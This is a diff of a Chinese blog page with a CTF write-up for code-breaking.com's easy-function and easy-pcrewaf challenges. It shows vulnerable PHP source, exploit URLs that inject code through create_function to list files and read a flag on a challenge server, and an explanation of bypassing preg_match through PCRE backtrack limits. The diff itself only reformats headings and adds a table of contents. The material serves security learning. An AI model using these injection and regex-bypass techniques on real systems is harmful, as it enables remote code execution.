@@ -108,20 +108,20 @@
 
 
 
-  <meta name="description" content="题目：https://code-breaking.com参考文献：https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.htmlhttps://blog.csdn.net/while0/article/details/72276440 ####easy-function源码1234567">
+  <meta name="description" content="题目：https://code-breaking.com参考文献：https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.htmlhttps://blog.csdn.net/while0/article/details/72276440 easy-function源码123456789&amp;l">
 <meta name="keywords" content="代码审计">
 <meta property="og:type" content="article">
 <meta property="og:title" content="p神代码审计知识星球二周年wp[1]">
 <meta property="og:url" content="https://cws6.github.io/2018/12/02/p神代码审计知识星球二周年wp-1/index.html">
 <meta property="og:site_name" content="cws6">
-<meta property="og:description" content="题目：https://code-breaking.com参考文献：https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.htmlhttps://blog.csdn.net/while0/article/details/72276440 ####easy-function源码1234567">
+<meta property="og:description" content="题目：https://code-breaking.com参考文献：https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.htmlhttps://blog.csdn.net/while0/article/details/72276440 easy-function源码123456789&amp;l">
 <meta property="og:locale" content="default">
 <meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5035860-d9b8ebdbd09e6a3d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
 <meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5035860-05b25bac04ad0706.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
-<meta property="og:updated_time" content="2018-12-02T10:08:33.406Z">
+<meta property="og:updated_time" content="2018-12-02T10:33:05.108Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="p神代码审计知识星球二周年wp[1]">
-<meta name="twitter:description" content="题目：https://code-breaking.com参考文献：https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.htmlhttps://blog.csdn.net/while0/article/details/72276440 ####easy-function源码1234567">
+<meta name="twitter:description" content="题目：https://code-breaking.com参考文献：https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.htmlhttps://blog.csdn.net/while0/article/details/72276440 easy-function源码123456789&amp;l">
 <meta name="twitter:image" content="https://upload-images.jianshu.io/upload_images/5035860-d9b8ebdbd09e6a3d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
 
 
@@ -368,7 +368,7 @@
                 
               
 
-              <time title="Created: 2018-12-02 18:07:50 / Modified: 18:08:33" itemprop="dateCreated datePublished" datetime="2018-12-02T18:07:50+08:00">2018-12-02</time>
+              <time title="Created: 2018-12-02 18:07:50 / Modified: 18:33:05" itemprop="dateCreated datePublished" datetime="2018-12-02T18:07:50+08:00">2018-12-02</time>
             
 
             
@@ -407,7 +407,7 @@
 
       
         <p>题目：<a href="https://code-breaking.com" target="_blank" rel="noopener">https://code-breaking.com</a><br>参考文献：<br><a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html</a><br><a href="https://blog.csdn.net/while0/article/details/72276440" target="_blank" rel="noopener">https://blog.csdn.net/while0/article/details/72276440</a></p>
-<p>####easy-function<br><strong>源码</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$action = $_GET[&apos;action&apos;] ?? &apos;&apos;;</span><br><span class="line">$arg = $_GET[&apos;arg&apos;] ?? &apos;&apos;;</span><br><span class="line"></span><br><span class="line">if(preg_match(&apos;/^[a-z0-9_]*$/isD&apos;, $action)) &#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $action(&apos;&apos;, $arg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<h4 id="easy-function"><a href="#easy-function" class="headerlink" title="easy-function"></a>easy-function</h4><p><strong>源码</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$action = $_GET[&apos;action&apos;] ?? &apos;&apos;;</span><br><span class="line">$arg = $_GET[&apos;arg&apos;] ?? &apos;&apos;;</span><br><span class="line"></span><br><span class="line">if(preg_match(&apos;/^[a-z0-9_]*$/isD&apos;, $action)) &#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $action(&apos;&apos;, $arg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
 <p><strong>解题思路</strong></p>
 <ul>
 <li>在数字字母下划线都被禁用的情况下调用函数，因为正则里面用了<code>^$</code>，就有可能在开头或结尾加入某个字符绕过正则且函数依旧能正常执行。最后发现<code>\</code>可以，不禁能绕过正则，还能使函数正常执行。</li>
@@ -425,12 +425,12 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">遍历文件夹下的所有文件：</span><br><span class="line">http://51.158.75.42:8087/index.php?action=\create_function&amp;arg=2;&#125;var_dump(scandir(%27.././%27));/*</span><br><span class="line">拿到flag：</span><br><span class="line">http://51.158.75.42:8087/?action=%5ccreate_function&amp;arg=2;&#125;var_dump(file_get_contents(%22/var/www/flag_h0w2execute_arb1trary_c0de%22));/*</span><br></pre></td></tr></table></figure>
 </li>
 </ul>
-<p>####easy-pcrewaf<br><strong>源码</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">function is_php($data)&#123;</span><br><span class="line">    return preg_match(&apos;/&lt;\?.*[(`;?&gt;].*/is&apos;, $data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(empty($_FILES)) &#123;</span><br><span class="line">    die(show_source(__FILE__));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$user_dir = &apos;data/&apos; . md5($_SERVER[&apos;REMOTE_ADDR&apos;]);</span><br><span class="line">$data = file_get_contents($_FILES[&apos;file&apos;][&apos;tmp_name&apos;]);</span><br><span class="line">if (is_php($data)) &#123;</span><br><span class="line">    echo &quot;bad request&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    @mkdir($user_dir, 0755);</span><br><span class="line">    $path = $user_dir . &apos;/&apos; . random_int(0, 10) . &apos;.php&apos;;</span><br><span class="line">    move_uploaded_file($_FILES[&apos;file&apos;][&apos;tmp_name&apos;], $path);</span><br><span class="line"></span><br><span class="line">    header(&quot;Location: $path&quot;, true, 303);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<h4 id="easy-pcrewaf"><a href="#easy-pcrewaf" class="headerlink" title="easy-pcrewaf"></a>easy-pcrewaf</h4><p><strong>源码</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">function is_php($data)&#123;</span><br><span class="line">    return preg_match(&apos;/&lt;\?.*[(`;?&gt;].*/is&apos;, $data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(empty($_FILES)) &#123;</span><br><span class="line">    die(show_source(__FILE__));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$user_dir = &apos;data/&apos; . md5($_SERVER[&apos;REMOTE_ADDR&apos;]);</span><br><span class="line">$data = file_get_contents($_FILES[&apos;file&apos;][&apos;tmp_name&apos;]);</span><br><span class="line">if (is_php($data)) &#123;</span><br><span class="line">    echo &quot;bad request&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    @mkdir($user_dir, 0755);</span><br><span class="line">    $path = $user_dir . &apos;/&apos; . random_int(0, 10) . &apos;.php&apos;;</span><br><span class="line">    move_uploaded_file($_FILES[&apos;file&apos;][&apos;tmp_name&apos;], $path);</span><br><span class="line"></span><br><span class="line">    header(&quot;Location: $path&quot;, true, 303);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
 <p><strong>解题思路</strong><br>判断一下用户输入的内容<code>有没有PHP代码</code>，如果没有，则写入文件。</p>
 <p><strong>先来分析下正则</strong><br>正则引擎，又被细分为DFA（确定性有限状态自动机）与NFA（非确定性有限状态自动机）。他们匹配输入的过程分别是：</p>
 <ul>
 <li>DFA: 从起始状态开始，一个字符一个字符地读取输入串，并根据正则来一步步确定至下一个转移状态，直到匹配不上或走完整个输入</li>
-<li>NFA：从起始状态开始，一个字符一个字符地读取输入串，并与正则表达式进行匹配，如果匹配不上，则进行<code>回溯</code>，尝试其他状态。<br>######<a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html" target="_blank" rel="noopener">回溯的过程</a><br>直接看p神的分析就行，贼详细就不多加叙述了<br>######PHP的<code>pcre.backtrack_limit</code>限制利用</li>
+<li>NFA：从起始状态开始，一个字符一个字符地读取输入串，并与正则表达式进行匹配，如果匹配不上，则进行<code>回溯</code>，尝试其他状态。<h6 id="回溯的过程"><a href="#回溯的过程" class="headerlink" title="回溯的过程"></a><a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html" target="_blank" rel="noopener">回溯的过程</a></h6>直接看p神的分析就行，贼详细就不多加叙述了<h6 id="PHP的pcre-backtrack-limit限制利用"><a href="#PHP的pcre-backtrack-limit限制利用" class="headerlink" title="PHP的pcre.backtrack_limit限制利用"></a>PHP的<code>pcre.backtrack_limit</code>限制利用</h6></li>
 </ul>
 <p>PHP为了防止正则表达式的拒绝服务攻击（reDOS），给pcre设定了一个回溯次数上限<code>pcre.backtrack_limit</code>。<br><img src="https://upload-images.jianshu.io/upload_images/5035860-d9b8ebdbd09e6a3d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br>回溯次数上限默认是<code>100万</code>。<br><img src="https://upload-images.jianshu.io/upload_images/5035860-05b25bac04ad0706.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br>当回溯次数超过了100万，<code>preg_match()</code>返回<code>false</code>，不是<code>1或0</code>。则绕过了正则。</p>
 <ul>
@@ -537,8 +537,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
             
@@ -599,6 +608,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#easy-function"><span class="nav-number">1.</span> <span class="nav-text">easy-function</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#easy-pcrewaf"><span class="nav-number">2.</span> <span class="nav-text">easy-pcrewaf</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#回溯的过程"><span class="nav-number">2.0.1.</span> <span class="nav-text">回溯的过程</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#PHP的pcre-backtrack-limit限制利用"><span class="nav-number">2.0.2.</span> <span class="nav-text">PHP的pcre.backtrack_limit限制利用</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
